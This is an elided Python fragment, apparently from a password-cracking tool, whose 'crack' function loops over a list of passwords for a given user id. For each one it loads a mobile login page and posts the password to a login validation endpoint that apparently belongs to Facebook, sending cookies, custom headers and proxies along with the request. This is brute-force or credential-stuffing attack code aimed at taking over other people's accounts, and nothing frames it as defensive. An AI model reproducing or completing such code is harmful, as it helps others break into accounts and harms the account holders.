...
def crack(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			p = ses.get(f'https://{url_log}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale2=id_ID&_rdr')
			...
			po = ses.post(f'https://{url_log}/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
